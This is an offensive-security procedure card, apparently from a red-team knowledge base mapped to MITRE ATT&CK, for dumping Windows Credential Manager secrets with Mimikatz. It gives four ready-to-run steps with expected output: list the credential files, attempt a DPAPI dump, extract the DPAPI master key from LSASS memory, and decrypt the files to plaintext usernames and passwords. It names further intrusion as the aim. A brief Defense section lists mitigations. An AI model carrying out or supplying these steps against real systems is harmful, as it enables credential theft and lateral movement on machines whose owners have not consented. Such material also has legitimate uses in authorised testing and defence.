---
id: ce9e713c-4c79-447e-b227-4e1a8e1c6510
name: Credential-Theft-with-Mimikatz-and-DPAPI
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.480714+00:00'
updated_at: '2023-04-10T20:37:18.754637+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/Credential Manager & DPAPI]]'
  - '[[tags/Windows - Mimikatz]]'
commands:
  - '[[commands/dir-list-user-credentials-folder]]'
  - '[[commands/mimikatz-dpapi-cred-dump-without-masterkey]]'
  - '[[commands/mimikatz-sekurlsa-dpapi-retrieve-masterkey]]'
  - '[[commands/mimikatz-dpapi-cred-decrypt-with-masterkey]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Credential-Theft-with-Mimikatz-and-DPAPI

## Summary

This procedure uses Mimikatz to extract plaintext credentials from the Windows Credential Manager by bypassing DPAPI encryption. It involves locating credential files, attempting initial extraction, retrieving the DPAPI master key from memory, and decrypting the credentials using the master key, enabling attackers to obtain sensitive usernames and passwords stored for applications and network resources.

## Description

Mimikatz is a post-exploitation tool that interacts with Windows memory and encryption mechanisms to dump credentials. In this procedure, it targets the Credential Manager, where Windows stores protected credentials using DPAPI (Data Protection API). DPAPI encrypts data with a master key derived from the user's login credentials and stored in the LSASS process. By first enumerating credential files in the user's AppData directory, attempting a direct dump (which reveals encrypted blobs), extracting the master key via sekurlsa module, and then decrypting specific files, attackers can recover plaintext credentials. This is typically used after gaining local administrator access on a compromised Windows host to harvest credentials for lateral movement or privilege escalation. The target environment is Windows 7/10/11 with Credential Manager enabled, and it assumes no advanced protections like LSA protection or credential guard are active.

## Requirements

1. Local administrator privileges on the target Windows system to access LSASS and protected files.
2. Mimikatz binary executed from an elevated command prompt.
3. Target user account with stored credentials in Credential Manager (e.g., from saved network shares or app logins).
4. No enabled Windows Defender Credential Guard or LSA protection, as these block LSASS access.

## Defense

- Enable Credential Guard on Windows 10/11 Enterprise to isolate LSASS and prevent memory scraping.
- Implement LSA protection via registry (HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL) to protect LSASS from external access.
- Monitor for Mimikatz signatures using EDR tools (e.g., process injection into LSASS, unusual file access in AppData\Credentials).
- Use Group Policy to disable Credential Manager storage for non-essential apps and enforce MFA everywhere.
- Regularly audit and clear stored credentials via credential manager UI or cmdkey /delete.

## Objectives

1. Locate and identify encrypted credential files in the user's profile.
2. Extract the DPAPI master key from LSASS memory to enable decryption.
3. Decrypt and retrieve plaintext credentials from specific files.
4. Use recovered credentials for further network access or escalation.

## Instructions

### Step 1: Enumerate Credential Files

**Context**: Begin by listing the contents of the Credential Manager directory to identify encrypted credential blobs. These files contain protected data like usernames and passwords for remote resources. Replace $_USERNAME with the target user's username (e.g., the compromised account).

**Command** ([[commands/dir-list-user-credentials-folder]]):
```cmd
dir C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\*
```

> This command scans the directory for .cred files, each identified by a GUID-like name. It helps select a specific file for extraction in later steps.

**Expected Output**:
```
 Volume in drive C is Windows
 Volume Serial Number is XXXX-XXXX

 Directory of C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials

[date]  [time]    <DIR>          .
[date]  [time]    <DIR>          ..
[date]  [time]             1,024 2647629F5AA74CD934ECD2F88D64ECD0
[date]  [time]             1,024 another-guid-here
               2 File(s)          2,048 bytes
```

### Step 2: Attempt Credential Dump Without Master Key

**Context**: Use Mimikatz to try dumping a specific credential file directly. This step will typically fail or show encrypted data, confirming the need for the master key, but it provides insight into the file's structure. Use the GUID from Step 1 as $_CREDENTIAL_FILE (e.g., 2647629F5AA74CD934ECD2F88D64ECD0).

**Command** ([[commands/mimikatz-dpapi-cred-dump-without-masterkey]]):
```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE" exit
```

> Run Mimikatz from an elevated prompt. The /in parameter specifies the input file path. Without the master key, Mimikatz cannot decrypt, but it outputs the encrypted blob for analysis.

**Expected Output**:
```
*** DPAPI backup keys extraction ***

"dpapi::cred /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE"

Credential file  : 'C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE'

* BLOBS *

  guid             : {2647629f-5aa7-4cd9-34ec-d2f88d64ecd0}
  masterKey        : No (null)
  descriptor       : [... encrypted descriptor ...]
  blob             : [... encrypted blob ...]
  blob (hex)       : 01000000d08c9ddf0115d1118c7a00c00...

ERROR kuhl_m_dpapi_cred_decrypt ; No masterkey available
```

### Step 3: Retrieve DPAPI Master Key

**Context**: Extract the DPAPI master key from the LSASS process memory using Mimikatz's sekurlsa module. This key is required to decrypt the credential blobs. The !sekurlsa::dpapi command dumps all DPAPI keys associated with the current user session.

**Context**: This provides the hex master key needed for decryption in the next step.

**Command** ([[commands/mimikatz-sekurlsa-dpapi-retrieve-masterkey]]):
```cmd
mimikatz.exe "sekurlsa::dpapi" exit
```

> Execute in an elevated Mimikatz session. It targets LSASS to pull DPAPI chain keys. Note the master key GUID and hex value for use in Step 4.

**Expected Output**:
```
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : $_USERNAME
Domain            : DOMAIN
Logon Server      : DC01
Logon Time        : [timestamp]
SID               : S-1-5-21-...-1001

* DPAPI backup keys *

Key GUID          : {d9c2c6d2-...}
Key CTS           : [timestamp]
Key SHA1          : [...]
Key               : 95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```

### Step 4: Decrypt Credentials Using Master Key

**Context**: Now use the master key from Step 3 to decrypt the credential file. This reveals plaintext credentials like username, password, and target resource. Provide the exact hex key as $_MASTER_KEY.

**Command** ([[commands/mimikatz-dpapi-cred-decrypt-with-masterkey]]):
```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE /masterkey:$_MASTER_KEY" exit
```

> The /masterkey parameter supplies the key for decryption. Success yields usable credentials for further attacks.

**Expected Output**:
```
"dpapi::cred /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE /masterkey:$_MASTER_KEY"

Credential file  : 'C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE'

* DECRYPTED *

  guid             : {2647629f-5aa7-4cd9-34ec-d2f88d64ecd0}
  masterKey        : Yes
  descriptor       : [...]
  blob             : [...]

*** Cred info ***
  Type  : GENERIC
  Name  : Legacy_Generic
  Data  : 
    username : targetuser
    password : P@ssw0rd123!
    comment  : Saved for \\server\share

*** Done ***
```
